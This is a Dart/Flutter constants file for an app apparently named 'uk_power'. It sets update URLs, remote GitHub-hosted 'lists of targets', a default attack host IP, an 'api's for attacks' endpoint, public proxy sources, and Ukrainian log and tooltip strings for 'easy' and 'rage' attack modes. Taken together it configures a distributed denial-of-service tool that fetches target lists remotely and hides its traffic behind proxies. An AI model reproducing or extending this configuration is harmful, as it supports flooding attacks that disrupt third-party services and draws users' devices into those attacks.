import 'package:flutter/material.dart';

/// app version
const appVersion = '3.1.2';

/// github app version
const pubFileURL = "https://raw.githubusercontent.com/escel-studio/uk_power/main/pubspec.yaml";

/// github releases url template
const updateURL = "https://github.com/escel-studio/uk_power/releases/download/VERSION/";

/// files
const androidFile = "Android.apk";
const windowsFile = "Windows.zip";
const linuxFile = "Linux.zip";

const logsFileName = "uk-power-logs.log";

/// default timeout for requests
const timeout = Duration(seconds: 20);

/// primary color
const primaryColor = Color(0xFF2697FF);

/// secondary color
const secondaryColor = Color(0xFF2A2D3E);

/// background color
const bgColor = Color(0xFF212332);

/// default widget padding
const defaultPadding = 16.0;

/// our list of targets
const sourceURL = "https://raw.githubusercontent.com/senpaiburado/zxcvbnty/main/ttqtet.txt";
/// supportive list of targets
const supportURL = "https://raw.githubusercontent.com/Kadzup/ygadiyes/main/smdvp.txt";

/// default url
const defaultHost = "http://65.108.20.65";

/// ukrainian api's for attacks
const apiURL = "https://hutin-puy.nadom.app/hosts.json";

// global list of proxies
/// API proxies
const proxySource1 = "https://proxylist.geonode.com/api/proxy-list?page=1&sort_by=lastChecked&sort_type=desc";
/// Updatable list of proxies
const proxySource2 = "http://spys.me/proxy.txt";
/// Our list of proxies (Github)
const proxySource3 = "https://raw.githubusercontent.com/Kadzup/ygadiyes/main/wwg.txt";

// logs msgs
const initError = "Виникла помилка при звертанні до джерел: ";
const invalidBodyError = "Неможливо розпізнати файл з цілями\n";
const hostsConnected = "Успішно з'єднано до COUNT ресурсів";
const directFound = "Успішно знайдено COUNT цілей";
const proxiesFound = "Успішно отримано ~COUNT проксі";
const tryAgainHosts = "Спробуйте ще раз, щось пішло не так\n";
const tryAgainDirect = "Неможливо отримати список цілей\n";
const hostsKW = "HOSTS: ";
const directKW = "DIRECT: ";
const timeoutError = "Перевищено очікування COUNT сек.";
const timeoutProxyError = "[Proxy] Перевищено очікування COUNT сек.";
const success = "Достукались";
const successProxy = "[Proxy] Достукались";

// tooltips
const easyModeTT = "Легкий режим атаки - він призначений використовувати оптимальні налаштування та алгоритми, щоб не перенавантажувати ваш пристрій.";
const rageModeTT = "Rage (лютий) режим атаки - він призначений для тих, хто готовий використовувати максимум ресурсу свого пристрою. Не рекомендуємо для телефонів.";
